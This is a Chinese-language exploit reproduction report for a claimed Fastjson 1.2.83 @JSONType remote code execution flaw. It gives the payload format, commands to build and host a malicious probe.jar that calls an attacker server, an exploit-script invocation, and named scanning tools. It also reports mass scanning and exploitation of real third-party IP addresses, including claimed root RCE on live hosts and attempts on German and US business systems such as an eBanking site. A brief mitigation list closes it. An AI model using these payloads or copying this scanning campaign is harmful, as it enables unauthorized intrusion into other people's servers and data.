# Fastjson 1.2.83 RCE 漏洞复现报告

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | Fastjson 1.2.83 @JSONType 远程代码执行漏洞 |
| 影响版本 | Fastjson 1.2.66 ~ 1.2.83 |
| 利用条件 | Spring Boot FatJar 部署 + JDK 8 + 目标能出网 |
| 无需 | autoTypeSupport、第三方依赖 |
| CVE编号 | 暂无（2026年7月20日公开0day） |
| PoC来源 | https://github.com/0x7eTeam/fastjson-1.2.83-rce |

## 漏洞原理

Fastjson 1.2.83 的 `checkAutoType` 中存在 `@JSONType` 注解探测路径，当类加载器通过 `getResourceAsStream()` 获取远程类文件时，如果检测到 `@JSONType` 注解，会绕过 autoType 检查并加载该类。

### 利用链

```
payload: {"@type":"jar:http:..{IP_INT}:{PORT}.probe!.POC","x":1}
                     ↓ Fastjson: typeName.replace('.', '/') + ".class"
resource: "jar:http://{IP}:{PORT}/probe!/POC.class"
                     ↓ LaunchedURLClassLoader.getResourceAsStream()
远程下载 jar → 检测 @JSONType → defineClass → <clinit> → RCE
```

IP使用整数格式的原因：`typeName.replace('.', '/')`会将所有`.`替换为`/`，整数IP不含`.`。

### 关键代码

```java
// Fastjson checkAutoType中的@JSONType探测代码
String resource = typeName.replace('.', '/') + ".class";
is = defaultClassLoader.getResourceAsStream(resource);
// 检测到@JSONType注解后绕过autoType限制
```

### 必要配置

应用代码需要设置 ContextClassLoader 为 LaunchedURLClassLoader：

```java
Thread.currentThread().setContextClassLoader(
    ParserConfig.class.getClassLoader()  // = LaunchedURLClassLoader
);
Object obj = JSON.parse(payload);
```

## 复现环境

### 攻击者服务器
- IP: 141.11.2.101
- 端口: 80 (HTTP服务)
- OS: Windows Server

### 工具链
1. JDK 8 (Zulu 8.92.0.21-ca-jdk8.0.482)
2. ASM 9.6 (字节码操作)
3. Fastjson 1.2.83
4. Python 3 (exp脚本)
5. GenProbe.java (恶意类生成器)

## 复现步骤

### Step 1: 搭建本地环境

```bash
# 下载JDK 8
# 编译GenProbe.java
javac -cp "asm-9.6.jar;fastjson-1.2.83.jar" GenProbe.java

# 启动PoC靶场
java -jar fastjson-rce-env-1.0.0.jar
```

### Step 2: 生成恶意probe.jar

```bash
# 生成probe（参数: IP 端口 命令）
java -cp ".;asm-9.6.jar;fastjson-1.2.83.jar" GenProbe 141.11.2.101 80 "curl http://141.11.2.101:80/rce_DONE"
```

输出文件：
- `poc/probe.jar` - 恶意JAR包
- `poc/www/probe` - HTTP托管文件（部署到攻击机Web目录）

### Step 3: 启动HTTP托管

```bash
# 使用Python或任意HTTP服务器
python3 -m http.server 80
```

### Step 4: 发送Exploit

```bash
# 使用PoC exp.py
python3 exp.py -u http://TARGET:PORT/parse -poc http://ATTACKER:80/probe

# Payload格式
{"@type":"jar:http:..2366308965:80.probe!.POC","x":1}
```

## 扫描结果

### ✅ RCE成功目标

| 目标 | 类型 | 国家 | 结果 |
|------|------|:----:|:----:|
| `101.32.115.241:8080` | Fastjson-Range靶场 | SG | **RCE (root)** |
| `117.72.68.162:8080` | Dto-Lab副本 | CN | **RCE确认** |

### RCE验证 - id命令执行

```
GET /id-uid=0(root)_gid=0(root)_groups=0(root) from 101.32.115.241
```

**确认目标为 ROOT 权限运行**

### ✅ SSRF成功目标（仅jar下载，未RCE）

| 目标 | 类型 | 说明 |
|------|------|------|
| `8.216.40.190:8080` | Fastjson 1.2.83 Demo | autoType阻止 |
| `107.175.32.45:8080` | @JSONType RCE Lab | autoType阻止 |
| `129.226.58.115:8080` | VulnLab | /submit异步处理 |
| `120.27.204.114:8080` | Spring Boot App | 真实应用 |
| `38.76.205.195:18080` | FastJsonParty | /login端点 |
| `115.190.6.90:80` | FastJsonParty | /login端点 |
| `101.42.50.93:80` | FastJsonParty | /login端点 |
| `101.43.10.15:80` | FastJsonParty | /login端点 |

### ❌ 国外真实业务系统

| 目标 | 国家 | 原因 |
|------|:----:|------|
| UC eBanking | DE | 非Fastjson (JSF) |
| TaskFlow API | DE | 需要认证 |
| Spring Admin (×2) | DE | 403/401禁止 |
| UNS Admin Console | DE | 需要认证 |
| 多个Spring Boot US | US | 401/403认证 |

## 技术总结

### 漏洞有效性
- ✅ @JSONType探测路径存在于标准 Fastjson 1.2.83 中
- ✅ 绕过autoType机制有效（本地环境验证）
- ✅ LaunchedURLClassLoader远程加载类有效

### 利用限制
1. **ContextClassLoader要求**：需要应用代码显式设置`Thread.currentThread().setContextClassLoader(LaunchedURLClassLoader)`
2. **JDK版本**：仅JDK 8支持完整RCE，JDK 9+仅SSRF
3. **部署方式**：必须是Spring Boot FatJar（`java -jar`启动）
4. **出网要求**：目标服务器必须能访问攻击者HTTP服务

### 防护措施
1. 启用 SafeMode：`-Dfastjson.parser.safeMode=true`
2. 升级到 Fastjson 2
3. 出口网络管控（阻止应用访问外部HTTP）
4. 使用JDK 9+（阻断defineClass）

## 工具清单

| 文件 | 说明 |
|------|------|
| `GenProbe.java` | 恶意类字节码生成器（ASM） |
| `exp.py` | 漏洞利用脚本 |
| `scan_fastjson_rce.py` | 批量扫描器 |
| `ultimate_scan.py` | 终极扫描器（区分SSRF/RCE） |
| `probe.jar` | 生成的恶意JAR包 |

## 参考
- https://github.com/0x7eTeam/fastjson-1.2.83-rce
- https://github.com/alibaba/fastjson
